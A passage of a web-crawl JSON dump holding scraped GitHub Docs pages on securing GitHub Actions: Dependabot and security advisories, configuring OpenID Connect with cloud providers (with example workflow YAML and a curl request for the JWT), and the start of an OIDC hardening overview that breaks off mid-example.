in a pull request, and helps prevent vulnerabilities being added to your repository. For more information, see [About dependency review](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-dependency-review#about-the-dependency-review-action).\n\n## [Keeping the actions in your workflows secure and up to date](#keeping-the-actions-in-your-workflows-secure-and-up-to-date)\n\nYou can use Dependabot to ensure that references to actions and reusable workflows used in your repository are kept up to date. Actions are often updated with bug fixes and new features to make automated processes faster, safer, and more reliable. Dependabot takes the effort out of maintaining your dependencies as it does this automatically for you. For more information, see [Keeping your actions up to date with Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot) and [About Dependabot security updates](https://docs.github.com/en/code-security/dependabot/dependabot-security-updates/about-dependabot-security-updates).\n\nThe following features can automatically update the actions in your workflows.\n\n*   **Dependabot version updates** open pull requests to update actions to the latest version when a new version is released.\n*   **Dependabot security updates** open pull requests to update actions with reported vulnerabilities to the minimum patched version.\n\nNote\n\n*   Dependabot only supports updates to GitHub Actions using the GitHub repository syntax, such as `actions/checkout@v4`. Dependabot will ignore actions or reusable workflows referenced locally (for example, `./.github/actions/foo.yml`).\n*   Docker Hub and GitHub Packages Container registry URLs are currently not supported. For example, references to Docker container actions using `docker://` syntax aren't supported.\n*   Dependabot supports both public and private repositories for GitHub Actions. For private registry configuration options, see \"`git`\" in [Dependabot options reference](https://docs.github.com/en/code-security/dependabot/dependabot-version-updates/configuration-options-for-the-dependabot.yml-file#git).\n\nFor information on how to configure Dependabot version updates, see [Configuring Dependabot version updates](https://docs.github.com/en/code-security/dependabot/dependabot-version-updates/configuring-dependabot-version-updates).\n\nFor information on how to configure Dependabot security updates, see [Configuring Dependabot security updates](https://docs.github.com/en/code-security/dependabot/dependabot-security-updates/configuring-dependabot-security-updates).\n\n## [Protecting actions you've created](#protecting-actions-youve-created)\n\nGitHub enables collaboration between people who publish and maintain actions and vulnerability reporters in order to promote secure coding. Repository security advisories allow maintainers of public repositories to privately discuss and fix a security vulnerability in a project. After collaborating on a fix, repository maintainers can publish the security advisory to publicly disclose the security vulnerability to the project's community. By publishing security advisories, repository maintainers make it easier for their community to update package dependencies and research the impact of the security vulnerabilities.\n\nIf you are someone who maintains an action that is used in other projects, you can use the following GitHub features to enhance the security of the actions you've published.\n\n*   Use the dependants view in the Dependency graph to see which projects depend on your code. If you receive a vulnerability report, this will give you an idea of who you need to communicate with about the vulnerability and how to fix it. For more information, see [Exploring the dependencies of a repository](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/exploring-the-dependencies-of-a-repository#dependents-view).\n*   Use repository security advisories to create a security advisory, privately collaborate to fix the vulnerability in a temporary private fork, and publish a security advisory to alert your community of the vulnerability once a patch is released. For more information, see [Configuring private vulnerability reporting for a repository](https://docs.github.com/en/code-security/security-advisories/working-with-repository-security-advisories/configuring-private-vulnerability-reporting-for-a-repository) and [Creating a repository security advisory](https://docs.github.com/en/code-security/security-advisories/working-with-repository-security-advisories/creating-a-repository-security-advisory).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 257,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-githubs-security-features-to-secure-your-use-of-github-actions-or",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-githubs-security-features-to-secure-your-use-of-github-actions-re",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-githubs-security-features-to-secure-your-use-of-github-actions-ex",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-githubs-security-features-to-secure-your-use-of-github-actions-re",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-githubs-security-features-to-secure-your-use-of-github-actions-re"
    },
    "lengths": {
      "extractus": 14013,
      "readableText": 12644,
      "none": 33623,
      "readableTextIfPossible": 12644,
      "result": 12644,
      "markdown": 11232
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers",
    "loadedTime": "2025-05-08T06:37:12.314Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers",
    "title": "Configuring OpenID Connect in cloud providers - GitHub Docs",
    "description": "Use OpenID Connect within your workflows to authenticate with cloud providers.",
    "author": null,
    "keywords": "Security",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Configuring OpenID Connect in cloud providers - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "BA9D:47FE5:343C:45A0:681C510E",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:02 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686222.411797, VS0, VE334",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29272",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Configuring OpenID Connect in cloud providers\nUse OpenID Connect within your workflows to authenticate with cloud providers.\nOverview\nOpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in your cloud provider, without having to store any credentials as long-lived GitHub secrets.\nTo use OIDC, you will first need to configure your cloud provider to trust GitHub's OIDC as a federated identity, and must then update your workflows to authenticate using tokens.\nPrerequisites\nTo learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see About security hardening with OpenID Connect.\nBefore proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you must define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see About security hardening with OpenID Connect.\nUpdating your GitHub Actions workflow\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\nAdd permissions settings for the token.\nUse the official action from your cloud provider to exchange the OIDC token (JWT) for a cloud access token.\nIf your cloud provider doesn't yet offer an official action, you can update your workflows to perform these steps manually.\nNote\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see Managing environments for deployment.\nAdding permissions settings\nThe job or workflow run requires a permissions setting with id-token: write to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the permissions for id-token is not set to write, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see About security hardening with OpenID Connect.\nThe id-token: write setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\nUsing environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN).\nUsing getIDToken() from the Actions toolkit.\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT contents: read # This is required for actions/checkout \nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT \nYou may need to specify additional permissions here, depending on your workflow's requirements.\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the permissions setting for id-token should be explicitly set to write at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\nFor more information, see Reusing workflows.\nUsing official actions\nIf your cloud provider has created an official action for using OIDC with GitHub Actions, it will allow you to easily exchange the OIDC token for an access token. You can then update your workflows to use this token when accessing cloud resources.\nFor example, Alibaba Cloud created aliyun/configure-aliyun-credentials-action to integrate with using OIDC with GitHub.\nUsing custom actions\nIf your cloud provider doesn't have an official action, or if you prefer to create custom scripts, you can manually request the JSON Web Token (JWT) from GitHub's OIDC provider.\nIf you're not using an official action, then GitHub recommends that you use the Actions core toolkit. Alternatively, you can use the following environment variables to retrieve the token: ACTIONS_ID_TOKEN_REQUEST_TOKEN, ACTIONS_ID_TOKEN_REQUEST_URL.\nTo update your workflows using this approach, you will need to make three changes to your YAML:\nAdd permissions settings for the token.\nAdd code that requests the OIDC token from GitHub's OIDC provider.\nAdd code that exchanges the OIDC token with your cloud provider for an access token.\nRequesting the JWT using the Actions core toolkit\nThe following example demonstrates how to use actions/github-script with the core toolkit to request the JWT from GitHub's OIDC provider. For more information, see Creating a JavaScript action.\njobs: job: environment: Production runs-on: ubuntu-latest steps: - name: Install OIDC Client from Core Package run: npm install @actions/core@1.6.0 @actions/http-client - name: Get Id Token uses: actions/github-script@v7 id: idtoken with: script: | const coredemo = require('@actions/core') let id_token = await coredemo.getIDToken() coredemo.setOutput('id_token', id_token) \nRequesting the JWT using environment variables\nThe following example demonstrates how to use environment variables to request a JSON Web Token.\nFor your deployment job, you will need to define the token settings, using actions/github-script with the core toolkit. For more information, see Creating a JavaScript action.\nFor example:\njobs: job: runs-on: ubuntu-latest steps: - uses: actions/github-script@v7 id: script timeout-minutes: 10 with: debug: true script: | const token = process.env['ACTIONS_RUNTIME_TOKEN'] const runtimeUrl = process.env['ACTIONS_ID_TOKEN_REQUEST_URL'] core.setOutput('TOKEN', token.trim()) core.setOutput('IDTOKENURL', runtimeUrl.trim()) \nYou can then use curl to retrieve a JWT from the GitHub OIDC provider. For example:\n- run: | IDTOKEN=$(curl -H \"Authorization: Bearer ${{steps.script.outputs.TOKEN}}\" ${{steps.script.outputs.IDTOKENURL}} -H \"Accept: application/json; api-version=2.0\" -H \"Content-Type: application/json\" -d \"{}\" | jq -r '.value') echo $IDTOKEN jwtd() { if [[ -x $(command -v jq) ]]; then jq -R 'split(\".\") | .[0],.[1] | @base64d | fromjson' <<< \"${1}\" echo \"Signature: $(echo \"${1}\" | awk -F'.' '{print $3}')\" fi } jwtd $IDTOKEN echo \"idToken=${IDTOKEN}\" >> $GITHUB_OUTPUT id: tokenid \nGetting the access token from the cloud provider\nYou will need to present the OIDC JSON web token to your cloud provider in order to obtain an access token.\nFor each deployment, your workflows must use cloud login actions (or custom scripts) that fetch the OIDC token and present it to your cloud provider. The cloud provider then validates the claims in the token; if successful, it provides a cloud access token that is available only to that job run. The provided access token can then be used by subsequent actions in the job to connect to the cloud and deploy to its resources.\nThe steps for exchanging the OIDC token for an access token will vary for each cloud provider.\nAccessing resources in your cloud provider\nOnce you've obtained the access token, you can use specific cloud actions or scripts to authenticate to the cloud provider and deploy to its resources. These steps could differ for each cloud provider.\nFor example, Alibaba Cloud maintains their own instructions for OIDC authentication. For more information, see Overview of OIDC-based SSO in the Alibaba Cloud documentation.\nIn addition, the default expiration time of this access token could vary between each cloud and can be configurable at the cloud provider's side.\nFurther reading\nUsing OpenID Connect with reusable workflows\nCommunicating with self-hosted runners",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-cloud-providers-4q87e.html",
  "markdown": "# Configuring OpenID Connect in cloud providers\n\nUse OpenID Connect within your workflows to authenticate with cloud providers.\n\n## [Overview](#overview)\n\nOpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in your cloud provider, without having to store any credentials as long-lived GitHub secrets.\n\nTo use OIDC, you will first need to configure your cloud provider to trust GitHub's OIDC as a federated identity, and must then update your workflows to authenticate using tokens.\n\n## [Prerequisites](#prerequisites)\n\n*   To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n    \n*   Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you **must** define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n    \n\n## [Updating your GitHub Actions workflow](#updating-your-github-actions-workflow)\n\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\n\n1.  Add permissions settings for the token.\n2.  Use the official action from your cloud provider to exchange the OIDC token (JWT) for a cloud access token.\n\nIf your cloud provider doesn't yet offer an official action, you can update your workflows to perform these steps manually.\n\nNote\n\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#deployment-protection-rules).\n\n### [Adding permissions settings](#adding-permissions-settings)\n\nThe job or workflow run requires a `permissions` setting with [`id-token: write`](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the `permissions` for `id-token` is not set to `write`, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n\nThe `id-token: write` setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\n\n*   Using environment variables on the runner (`ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`).\n*   Using `getIDToken()` from the Actions toolkit.\n\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout\n```\n\nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n```\n\nYou may need to specify additional permissions here, depending on your workflow's requirements.\n\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the `permissions` setting for `id-token` should be explicitly set to `write` at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\n\nFor more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n### [Using official actions](#using-official-actions)\n\nIf your cloud provider has created an official action for using OIDC with GitHub Actions, it will allow you to easily exchange the OIDC token for an access token. You can then update your workflows to use this token when accessing cloud resources.\n\nFor example, Alibaba Cloud created [`aliyun/configure-aliyun-credentials-action`](https://github.com/aliyun/configure-aliyun-credentials-action) to integrate with using OIDC with GitHub.\n\n## [Using custom actions](#using-custom-actions)\n\nIf your cloud provider doesn't have an official action, or if you prefer to create custom scripts, you can manually request the JSON Web Token (JWT) from GitHub's OIDC provider.\n\nIf you're not using an official action, then GitHub recommends that you use the Actions core toolkit. Alternatively, you can use the following environment variables to retrieve the token: `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, `ACTIONS_ID_TOKEN_REQUEST_URL`.\n\nTo update your workflows using this approach, you will need to make three changes to your YAML:\n\n1.  Add permissions settings for the token.\n2.  Add code that requests the OIDC token from GitHub's OIDC provider.\n3.  Add code that exchanges the OIDC token with your cloud provider for an access token.\n\n### [Requesting the JWT using the Actions core toolkit](#requesting-the-jwt-using-the-actions-core-toolkit)\n\nThe following example demonstrates how to use `actions/github-script` with the `core` toolkit to request the JWT from GitHub's OIDC provider. For more information, see [Creating a JavaScript action](https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action#adding-actions-toolkit-packages).\n\n```\njobs:\n  job:\n    environment: Production\n    runs-on: ubuntu-latest\n    steps:\n    - name: Install OIDC Client from Core Package\n      run: npm install @actions/core@1.6.0 @actions/http-client\n    - name: Get Id Token\n      uses: actions/github-script@v7\n      id: idtoken\n      with:\n        script: |\n          const coredemo = require('@actions/core')\n          let id_token = await coredemo.getIDToken()\n          coredemo.setOutput('id_token', id_token)\n```\n\n### [Requesting the JWT using environment variables](#requesting-the-jwt-using-environment-variables)\n\nThe following example demonstrates how to use environment variables to request a JSON Web Token.\n\nFor your deployment job, you will need to define the token settings, using `actions/github-script` with the `core` toolkit. For more information, see [Creating a JavaScript action](https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action#adding-actions-toolkit-packages).\n\nFor example:\n\n```\njobs:\n  job:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/github-script@v7\n      id: script\n      timeout-minutes: 10\n      with:\n        debug: true\n        script: |\n          const token = process.env['ACTIONS_RUNTIME_TOKEN']\n          const runtimeUrl = process.env['ACTIONS_ID_TOKEN_REQUEST_URL']\n          core.setOutput('TOKEN', token.trim())\n          core.setOutput('IDTOKENURL', runtimeUrl.trim())\n```\n\nYou can then use `curl` to retrieve a JWT from the GitHub OIDC provider. For example:\n\n```\n    - run: |\n        IDTOKEN=$(curl -H \"Authorization: Bearer ${{steps.script.outputs.TOKEN}}\" ${{steps.script.outputs.IDTOKENURL}}  -H \"Accept: application/json; api-version=2.0\" -H \"Content-Type: application/json\" -d \"{}\" | jq -r '.value')\n        echo $IDTOKEN\n        jwtd() {\n            if [[ -x $(command -v jq) ]]; then\n                jq -R 'split(\".\") | .[0],.[1] | @base64d | fromjson' <<< \"${1}\"\n                echo \"Signature: $(echo \"${1}\" | awk -F'.' '{print $3}')\"\n            fi\n        }\n        jwtd $IDTOKEN\n        echo \"idToken=${IDTOKEN}\" >> $GITHUB_OUTPUT\n      id: tokenid\n```\n\n### [Getting the access token from the cloud provider](#getting-the-access-token-from-the-cloud-provider)\n\nYou will need to present the OIDC JSON web token to your cloud provider in order to obtain an access token.\n\nFor each deployment, your workflows must use cloud login actions (or custom scripts) that fetch the OIDC token and present it to your cloud provider. The cloud provider then validates the claims in the token; if successful, it provides a cloud access token that is available only to that job run. The provided access token can then be used by subsequent actions in the job to connect to the cloud and deploy to its resources.\n\nThe steps for exchanging the OIDC token for an access token will vary for each cloud provider.\n\n### [Accessing resources in your cloud provider](#accessing-resources-in-your-cloud-provider)\n\nOnce you've obtained the access token, you can use specific cloud actions or scripts to authenticate to the cloud provider and deploy to its resources. These steps could differ for each cloud provider.\n\nFor example, Alibaba Cloud maintains their own instructions for OIDC authentication. For more information, see [Overview of OIDC-based SSO](https://www.alibabacloud.com/help/en/ram/user-guide/overview-of-oidc-based-sso) in the Alibaba Cloud documentation.\n\nIn addition, the default expiration time of this access token could vary between each cloud and can be configurable at the cloud provider's side.\n\n## [Further reading](#further-reading)\n\n*   [Using OpenID Connect with reusable workflows](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows)\n*   [Communicating with self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/communicating-with-self-hosted-runners)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 255,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-cloud-providers-origi",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-cloud-providers-remov",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-cloud-providers-extra",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-cloud-providers-reada",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-cloud-providers-reada"
    },
    "lengths": {
      "extractus": 14672,
      "readableText": 13139,
      "none": 36649,
      "readableTextIfPossible": 13139,
      "result": 13139,
      "markdown": 10529
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect",
    "loadedTime": "2025-05-08T06:37:09.522Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect",
    "title": "About security hardening with OpenID Connect - GitHub Docs",
    "description": "OpenID Connect allows your workflows to exchange short-lived tokens directly from your cloud provider.",
    "author": null,
    "keywords": "Security",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "About security hardening with OpenID Connect - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "4816:218DC9:379D:49DA:681C510C",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "date": "Thu, 08 May 2025 06:37:01 GMT",
      "via": "1.1 varnish",
      "age": "0",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686220.435019, VS0, VE1377",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "38404",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "About security hardening with OpenID Connect\nOpenID Connect allows your workflows to exchange short-lived tokens directly from your cloud provider.\nOverview of OpenID Connect\nGitHub Actions workflows are often designed to access a cloud provider (such as AWS, Azure, GCP, or HashiCorp Vault) in order to deploy software or use the cloud's services. Before the workflow can access these resources, it will supply credentials, such as a password or token, to the cloud provider. These credentials are usually stored as a secret in GitHub, and the workflow presents this secret to the cloud provider every time it runs.\nHowever, using hardcoded secrets requires you to create credentials in the cloud provider and then duplicate them in GitHub as a secret.\nWith OpenID Connect (OIDC), you can take a different approach by configuring your workflow to request a short-lived access token directly from the cloud provider. Your cloud provider also needs to support OIDC on their end, and you must configure a trust relationship that controls which workflows are able to request the access tokens. Providers that currently support OIDC include Amazon Web Services, Azure, Google Cloud Platform, and HashiCorp Vault, among others.\nBenefits of using OIDC\nBy updating your workflows to use OIDC tokens, you can adopt the following good security practices:\nNo cloud secrets: You won't need to duplicate your cloud credentials as long-lived GitHub secrets. Instead, you can configure the OIDC trust on your cloud provider, and then update your workflows to request a short-lived access token from the cloud provider through OIDC.\nAuthentication and authorization management: You have more granular control over how workflows can use credentials, using your cloud provider's authentication (authN) and authorization (authZ) tools to control access to cloud resources.\nRotating credentials: With OIDC, your cloud provider issues a short-lived access token that is only valid for a single job, and then automatically expires.\nGetting started with OIDC\nThe following diagram gives an overview of how GitHub's OIDC provider integrates with your workflows and cloud provider:\nIn your cloud provider, create an OIDC trust between your cloud role and your GitHub workflow(s) that need access to the cloud.\nEvery time your job runs, GitHub's OIDC Provider auto-generates an OIDC token. This token contains multiple claims to establish a security-hardened and verifiable identity about the specific workflow that is trying to authenticate.\nYou could include a step or action in your job to request this token from GitHub's OIDC provider, and present it to the cloud provider.\nOnce the cloud provider successfully validates the claims presented in the token, it then provides a short-lived cloud access token that is available only for the duration of the job.\nConfiguring the OIDC trust with the cloud\nWhen you configure your cloud to trust GitHub's OIDC provider, you must add conditions that filter incoming requests, so that untrusted repositories or workflows can’t request access tokens for your cloud resources:\nBefore granting an access token, your cloud provider checks that the subject and other claims used to set conditions in its trust settings match those in the request's JSON Web Token (JWT). As a result, you must take care to correctly define the subject and other conditions in your cloud provider.\nThe OIDC trust configuration steps and the syntax to set conditions for cloud roles (using Subject and other claims) will vary depending on which cloud provider you're using. For some examples, see Example subject claims.\nUnderstanding the OIDC token\nEach job requests an OIDC token from GitHub's OIDC provider, which responds with an automatically generated JSON web token (JWT) that is unique for each workflow job where it is generated. When the job runs, the OIDC token is presented to the cloud provider. To validate the token, the cloud provider checks if the OIDC token's subject and other claims are a match for the conditions that were preconfigured on the cloud role's OIDC trust definition.\nThe following example OIDC token uses a subject (sub) that references a job environment named prod in the octo-org/octo-repo repository.\n{ \"typ\": \"JWT\", \"alg\": \"RS256\", \"x5t\": \"example-thumbprint\", \"kid\": \"example-key-id\" } { \"jti\": \"example-id\", \"sub\": \"repo:octo-org/octo-repo:environment:prod\", \"environment\": \"prod\", \"aud\": \"https://github.com/octo-org\", \"ref\": \"refs/heads/main\", \"sha\": \"example-sha\", \"repository\": \"octo-org/octo-repo\", \"repository_owner\": \"octo-org\", \"actor_id\": \"12\", \"repository_visibility\": \"private\", \"repository_id\": \"74\", \"repository_owner_id\": \"65\", \"run_id\": \"example-run-id\", \"run_number\": \"10\", \"run_attempt\": \"2\", 